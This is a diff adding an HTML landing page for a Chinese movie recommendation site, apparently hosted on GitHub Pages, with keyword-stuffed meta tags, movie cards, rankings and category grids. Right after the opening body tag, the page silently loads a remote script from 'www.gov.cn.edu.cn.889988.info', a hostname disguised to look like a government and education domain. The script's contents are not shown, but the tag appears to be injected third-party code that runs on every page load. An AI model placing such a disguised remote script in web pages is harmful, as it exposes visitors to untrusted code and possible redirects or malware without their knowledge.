@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>好看站电影网 - 全网影视在线观看推荐平台 | 高分好片每日精选</title>
+<meta name="description" content="好看站电影网(haokanzhandianyingwang-zh.github.io)专注全网高分影视作品在线观看与推荐，每日精选院线大片、经典老片、热门剧集，一站式影视导航平台，发现更多值得看的好电影。">
+<meta name="keywords" content="好看站电影网,全网影视推荐,高分电影在线观看,热门影视导航,院线大片推荐,经典老片回顾,好片精选,影视排行榜">
+<link rel="canonical" href="https://haokanzhandianyingwang-zh.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#f4f7f5;--card:#ffffff;--ink:#1f2a24;--muted:#5f6d65;--line:#e2ebe6;
+  --green:#0f9d63;--green-d:#0b7a4d;--teal:#12b3a3;--amber:#f5a623;--soft:#e8f6ef;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.7;-webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.container{max-width:1140px;margin:0 auto;padding:0 22px}
+
+/* 顶部 */
+.header{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:999;box-shadow:0 2px 14px rgba(15,157,99,.05)}
+.header-in{display:flex;align-items:center;justify-content:space-between;height:68px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo-mark{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,var(--green),var(--teal));display:flex;align-items:center;justify-content:center;font-size:20px;color:#fff;font-weight:800;box-shadow:0 4px 12px rgba(15,157,99,.3)}
+.logo b{font-size:20px;letter-spacing:.5px;color:var(--ink)}
+.logo b i{color:var(--green);font-style:normal}
+.menu{display:flex;gap:6px;align-items:center}
+.menu a{padding:8px 15px;font-size:15px;color:var(--muted);border-radius:20px;transition:.25s}
+.menu a:hover{background:var(--soft);color:var(--green)}
+.menu .cta{background:var(--green);color:#fff;border-radius:20px;padding:9px 20px}
+.menu .cta:hover{background:var(--green-d);color:#fff}
+.hamb{display:none;width:34px;height:34px;border-radius:9px;background:var(--soft);align-items:center;justify-content:center;cursor:pointer;font-size:18px;color:var(--green)}
+.hamb span{font-size:20px;line-height:1}
+
+/* Hero */
+.hero{background:linear-gradient(160deg,#eafaf2 0%,#f4f7f5 55%,#fff 100%);padding:84px 0 64px;text-align:center;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;width:420px;height:420px;border-radius:50%;background:radial-gradient(circle,rgba(15,157,99,.07),transparent 70%);top:-160px;right:-120px}
+.kicker{display:inline-block;background:#fff;border:1px solid var(--line);border-radius:30px;padding:6px 18px;font-size:13px;color:var(--green);margin-bottom:22px;box-shadow:0 2px 10px rgba(0,0,0,.03)}
+.hero h1{font-size:46px;font-weight:800;letter-spacing:-.5px;line-height:1.25;margin-bottom:18px;color:var(--ink)}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--green),var(--teal));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-sub{font-size:17px;color:var(--muted);max-width:580px;margin:0 auto 32px}
+.searchbar{max-width:560px;margin:0 auto;background:#fff;border-radius:40px;display:flex;align-items:center;padding:6px 6px 6px 22px;border:1px solid var(--line);box-shadow:0 8px 28px rgba(15,157,99,.12)}
+.searchbar input{flex:1;border:none;outline:none;font-size:15px;background:transparent;color:var(--ink)}
+.searchbar button{background:var(--green);color:#fff;border:none;padding:12px 26px;border-radius:30px;font-size:15px;cursor:pointer;font-weight:600;transition:.25s}
+.searchbar button:hover{background:var(--green-d)}
+
+/* 分类药丸 */
+.chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:30px}
+.chip{background:#fff;border:1px solid var(--line);border-radius:30px;padding:7px 18px;font-size:14px;color:var(--muted);cursor:pointer;transition:.2s}
+.chip:hover{border-color:var(--green);color:var(--green)}
+
+/* 栏目通用 */
+section{padding:74px 0}
+.eyebrow{font-size:12px;color:var(--green);font-weight:700;letter-spacing:2px;text-transform:uppercase;display:block;margin-bottom:6px}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:36px;gap:20px;flex-wrap:wrap}
+.sec-head h2{font-size:27px;font-weight:800;letter-spacing:-.3px}
+.sec-head h2 span{color:var(--green)}
+.sec-head a.more{font-size:14px;color:var(--green);white-space:nowrap}
+.sec-head a.more:hover{text-decoration:underline}
+
+/* 推荐瀑布卡片 */
+.grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.movie{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.28s;cursor:pointer}
+.movie:hover{transform:translateY(-5px);box-shadow:0 14px 34px rgba(15,157,99,.14);border-color:#cfe8dc}
+.poster{height:215px;display:flex;align-items:center;justify-content:center;font-size:52px;position:relative}
+.poster .rate{position:absolute;top:12px;left:12px;background:rgba(255,255,255,.95);color:var(--green);font-size:12px;font-weight:700;padding:3px 9px;border-radius:8px}
+.poster .hd{position:absolute;top:12px;right:12px;background:var(--amber);color:#fff;font-size:11px;padding:3px 9px;border-radius:8px;font-weight:600}
+.info{padding:16px}
+.info h4{font-size:16px;font-weight:700;margin-bottom:6px}
+.info .cat{font-size:12px;color:var(--teal)}
+.info .desc{font-size:13px;color:var(--muted);margin-top:6px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* 双栏精选 */
+.split{display:grid;grid-template-columns:1.15fr 1fr;gap:28px}
+.featured{background:linear-gradient(140deg,var(--green),var(--teal));border-radius:20px;padding:36px;color:#fff;display:flex;flex-direction:column;justify-content:space-between;min-height:340px}
+.featured .ftag{font-size:12px;letter-spacing:2px;opacity:.85;margin-bottom:12px;display:block}
+.featured h3{font-size:30px;font-weight:800;line-height:1.35;margin-bottom:14px}
+.featured p{font-size:14px;opacity:.92}
+.featured .fbtn{margin-top:22px;align-self:flex-start;background:#fff;color:var(--green);padding:11px 24px;border-radius:30px;font-weight:600;font-size:14px}
+.side-list{display:flex;flex-direction:column;gap:14px}
+.side-item{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:center;transition:.25s}
+.side-item:hover{border-color:var(--green)}
+.num{width:32px;height:32px;border-radius:9px;background:var(--soft);color:var(--green);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;flex-shrink:0}
+.side-item h5{font-size:15px;font-weight:600}
+.side-item p{font-size:12px;color:var(--muted)}
+
+/* 分类宫格 */
+.cat-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:16px}
+.cat-cell{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px 12px;text-align:center;transition:.25s;cursor:pointer}
+.cat-cell:hover{background:var(--green);border-color:var(--green);color:#fff}
+.cat-cell .ico{font-size:26px;display:block;margin-bottom:8px}
+.cat-cell .cn{font-size:14px;font-weight:600}
+
+/* 关于 */
+.about{background:#fff;border-top:1px solid var(--line)}
+.about-in{display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center}
+.about-in h2{font-size:27px;font-weight:800;margin-bottom:18px}
+.about-in p{color:var(--muted);margin-bottom:14px;font-size:15px}
+.about-in .url{color:var(--green);font-weight:600}
+.points{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.point{background:var(--bg);border-radius:14px;padding:20px}
+.point .pt{font-size:22px;margin-bottom:8px;display:block}
+.point h5{font-size:15px;font-weight:700;margin-bottom:4px}
+.point p{font-size:13px;color:var(--muted);margin:0}
+
+/* 页脚 */
+footer{background:#12231c;padding:52px 0 26px}
+.foot-in{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:30px}
+.foot-in h4{color:#fff;font-size:15px;margin-bottom:14px}
+.foot-in p,.foot-in a{color:#9fb2a8;font-size:14px;line-height:2}
+.foot-in a{display:block;transition:.2s}
+.foot-in a:hover{color:var(--teal)}
+.copyright{text-align:center;color:#6f837a;font-size:12px;border-top:1px solid #244034;padding-top:20px}
+
+@media(max-width:980px){
+  .hero{padding:56px 0 44px}
+  .hero h1{font-size:32px}
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .cat-grid{grid-template-columns:repeat(3,1fr)}
+  .split{grid-template-columns:1fr}
+  section{padding:52px 0}
+  .about-in{grid-template-columns:1fr;gap:32px}
+  .sec-head h2{font-size:22px}
+}
+@media(max-width:620px){
+  .hamb{display:flex}
+  .menu{position:absolute;top:68px;left:0;right:0;flex-direction:column;background:#fff;border-bottom:1px solid var(--line);padding:14px;display:none;box-shadow:0 10px 24px rgba(0,0,0,.06)}
+  .menu.active{display:flex}
+  .menu a{width:100%;text-align:center;padding:12px}
+  .hero h1{font-size:26px}
+  .hero-sub{font-size:15px}
+  .grid-4,.cat-grid{grid-template-columns:repeat(2,1fr)}
+  .points{grid-template-columns:1fr}
+  .foot-in{grid-template-columns:1fr 1fr;gap:24px}
+  .searchbar input{font-size:14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="header">
+  <div class="container header-in">
+    <div class="logo">
+      <div class="logo-mark">好</div>
+      <b>好看站<i>电影网</i></b>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#hot">热播推荐</a>
+      <a href="#rank">口碑榜单</a>
+      <a href="#cat">影片分类</a>
+      <a href="#about">关于我们</a>
+      <a href="#" class="cta">立即观看</a>
+    </nav>
+    <div class="hamb" id="hamb"><span>☰</span></div>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="container">
+    <span class="kicker">🎬 全网影视 · 每日精选 · 高分好片</span>
+    <h1>发现更多<br><em>值得看好</em>的电影</h1>
+    <p class="hero-sub">好看站电影网（haokanzhandianyingwang-zh.github.io）汇聚全网高分影视资源，院线大片、经典老片、热门剧集一站导航，每天为你精选值得一看的好作品。</p>
+    <div class="searchbar">
+      <input type="text" placeholder="搜索电影 / 电视剧 / 演员 / 类型…">
+      <button>搜索</button>
+    </div>
+    <div class="chips">
+      <span class="chip">🔥 热播榜</span>
+      <span class="chip">⭐ 高分精选</span>
+      <span class="chip">🎞️ 院线大片</span>
+      <span class="chip">📺 热门剧集</span>
+      <span class="chip">🏆 经典老片</span>
+    </div>
+  </div>
+</section>
+
+<!-- 热播推荐 -->
+<section id="hot">
+  <div class="container">
+    <div class="sec-head">
+      <div><span class="eyebrow">Hot Picks</span><h2>热播 <span>推荐</span></h2></div>
+      <a href="#" class="more">查看全部 ›</a>
+    </div>
+    <div class="grid-4">
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#ff6b6b,#ee5a24)">🚀<span class="rate">9.4</span><span class="hd">HD</span></div>
+        <div class="info"><h4>星际穿越</h4><div class="cat">科幻 · 冒险</div><p class="desc">诺兰执导的硬核科幻巨制，穿越虫洞寻找人类新家园的宇宙史诗。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#4facfe,#00f2fe)">🐉<span class="rate">9.1</span><span class="hd">HD</span></div>
+        <div class="info"><h4>卧虎藏龙</h4><div class="cat">武侠 · 动作</div><p class="desc">李安镜头下的东方武侠美学，竹林飞檐的经典画面至今难忘。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#f7971e,#ffd200)">🦁<span class="rate">9.0</span><span class="hd">HD</span></div>
+        <div class="info"><h4>狮子王</h4><div class="cat">动画 · 家庭</div><p class="desc">迪士尼经典动画，小狮子辛巴成长为草原之王的励志故事。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#a18cd1,#fbc2eb)">💫<span class="rate">8.8</span><span class="hd">HD</span></div>
+        <div class="info"><h4>星际迷航</h4><div class="cat">科幻 · 冒险</div><p class="desc">探索未知的星辰大海，充满想象力与冒险精神的科幻经典。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#43e97b,#38f9d7)">🥊<span class="rate">8.9</span><span class="hd">HD</span></div>
+        <div class="info"><h4>洛奇</h4><div class="cat">运动 · 励志</div><p class="desc">一个无名拳手的逆袭之路，永不言弃的体育励志经典。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#fa709a,#fee140)">🎭<span class="rate">9.2</span><span class="hd">HD</span></div>
+        <div class="info"><h4>喜剧之王</h4><div class="cat">喜剧 · 剧情</div><p class="desc">周星驰自传式喜剧，小人物的辛酸与坚持，笑着笑着就哭了。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#667eea,#764ba2)">🏹<span class="rate">8.7</span><span class="hd">HD</span></div>
+        <div class="info"><h4>英雄</h4><div class="cat">武侠 · 历史</div><p class="desc">张艺谋的色彩美学武侠，无名刺秦的壮烈传奇，视觉震撼。</p></div>
+      </div>
+      <div class="movie">
+        <div class="poster" style="background:linear-gradient(160deg,#f83600,#f9d423)">🎬<span class="rate">9.3</span><span class="hd">HD</span></div>
+        <div class="info"><h4>阿甘正传</h4><div class="cat">剧情 · 励志</div><p class="desc">智商只有75的阿甘跑出了传奇人生，关于命运与坚持的温暖寓言。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 口碑榜单 -->
+<section id="rank" style="background:#fff">
+  <div class="container">
+    <div class="sec-head">
+      <div><span class="eyebrow">Top Ranking</span><h2>口碑 <span>榜单</span></h2></div>
+      <a href="#" class="more">完整榜单 ›</a>
+    </div>
+    <div class="split">
+      <div class="featured">
+        <div>
+          <span class="ftag">本周精选 · EDITOR'S PICK</span>
+          <h3>肖申克的救赎</h3>
+          <p>一部关于希望与自由的旷世杰作，二十余年稳居 IMDb 榜首。安迪用一把小石锤凿穿了十九年的牢狱岁月，也凿进了每一个观众的心里。无论重温多少遍，它都能在深夜给你力量。</p>
+        </div>
+        <a href="#" class="fbtn">查看详情 →</a>
+      </div>
+      <div class="side-list">
+        <div class="side-item"><div class="num">1</div><div><h5>霸王别姬</h5><p>剧情 · 9.6分 · 华语电影巅峰</p></div></div>
+        <div class="side-item"><div class="num">2</div><div><h5>泰坦尼克号</h5><p>爱情 · 9.4分 · 不朽的海洋史诗</p></div></div>
+        <div class="side-item"><div class="num">3</div><div><h5>这个杀手不太冷</h5><p>动作 · 9.4分 · 冷酷与温柔并存</p></div></div>
+        <div class="side-item"><div class="num">4</div><div><h5>美丽人生</h5><p>剧情 · 9.5分 · 父爱的极致浪漫</p></div></div>
+        <div class="side-item"><div class="num">5</div><div><h5>千与千寻</h5><p>动画 · 9.4分 · 宫崎骏的奇幻世界</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 影片分类 -->
+<section id="cat">
+  <div class="container">
+    <div class="sec-head">
+      <div><span class="eyebrow">Categories</span><h2>影片 <span>分类</span></h2></div>
+      <a href="#" class="more">更多分类 ›</a>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-cell"><span class="ico">🔥</span><span class="cn">动作冒险</span></div>
+      <div class="cat-cell"><span class="ico">😂</span><span class="cn">喜剧搞笑</span></div>
+      <div class="cat-cell"><span class="ico">💕</span><span class="cn">爱情文艺</span></div>
+      <div class="cat-cell"><span class="ico">🔍</span><span class="cn">悬疑惊悚</span></div>
+      <div class="cat-cell"><span class="ico">🚀</span><span class="cn">科幻奇幻</span></div>
+      <div class="cat-cell"><span class="ico">🎭</span><span class="cn">剧情传记</span></div>
+      <div class="cat-cell"><span class="ico">🏰</span><span class="cn">古装历史</span></div>
+      <div class="cat-cell"><span class="ico">🥊</span><span class="cn">运动励志</span></div>
+      <div class="cat-cell"><span class="ico">👻</span><span class="cn">恐怖惊悚</span></div>
+      <div class="cat-cell"><span class="ico">🎵</span><span class="cn">音乐歌舞</span></div>
+      <div class="cat-cell"><span class="ico">📺</span><span class="cn">热门剧集</span></div>
+      <div class="cat-cell"><span class="ico">🎬</span><span class="cn">经典老片</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about" id="about">
+  <div class="container about-in">
+    <div>
+      <span class="eyebrow">About Us</span>
+      <h2>关于好看站电影网</h2>
+      <p>好看站电影网（haokanzhandianyingwang-zh.github.io）是一个专注全网高分影视推荐与在线观看导航的平台，致力于帮助观众在海量的影视内容中快速发现真正值得一看的好作品。</p>
+      <p>我们每天精选院线大片、经典老片、热门剧集，覆盖动作、喜剧、爱情、悬疑、科幻等多种类型，让找片不再困难，让每一段观影时光都不被辜负。</p>
+      <p>访问地址：<a href="https://haokanzhandianyingwang-zh.github.io/" class="url">https://haokanzhandianyingwang-zh.github.io/</a></p>
+    </div>
+    <div class="points">
+      <div class="point"><span class="pt">🎯</span><h5>精选推荐</h5><p>每日人工精选，拒绝烂片，只推高分佳作。</p></div>
+      <div class="point"><span class="pt">⚡</span><h5>快速导航</h5><p>分类清晰，搜索便捷，找片只需几秒钟。</p></div>
+      <div class="point"><span class="pt">📈</span><h5>实时榜单</h5><p>热播、口碑、经典多维度榜单实时更新。</p></div>
+      <div class="point"><span class="pt">📱</span><h5>全端适配</h5><p>手机、平板、电脑多端自适应流畅浏览。</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="foot-in">
+      <div>
+        <h4>好看站电影网</h4>
+        <p>全网影视推荐与在线观看导航平台，每日精选高分好片，让找片更简单。</p>
+      </div>
+      <div>
+        <h4>热门栏目</h4>
+        <a href="#hot">热播推荐</a>
+        <a href="#rank">口碑榜单</a>
+        <a href="#cat">影片分类</a>
+        <a href="#">高分精选</a>
+      </div>
+      <div>
+        <h4>影片类型</h4>
+        <a href="#">动作冒险</a>
+        <a href="#">喜剧爱情</a>
+        <a href="#">悬疑科幻</a>
+        <a href="#">经典老片</a>
+      </div>
+      <div>
+        <h4>关于我们</h4>
+        <a href="#about">关于本站</a>
+        <a href="#">免责声明</a>
+        <a href="#">合作投稿</a>
+        <a href="#">联系我们</a>
+      </div>
+    </div>
+    <div class="copyright">© 2026 好看站电影网 haokanzhandianyingwang-zh.github.io · 本站仅提供影视信息分享与导航服务，所有资源版权归原作者所有</div>
+  </div>
+</footer>
+
+<script>
+document.getElementById("hamb").addEventListener("click",function(){
+  document.getElementById("menu").classList.toggle("active");
+});
+document.querySelectorAll(".menu a").forEach(function(a){
+  a.addEventListener("click",function(){document.getElementById("menu").classList.remove("active");});
+});
+</script>
+</body>
+</html>
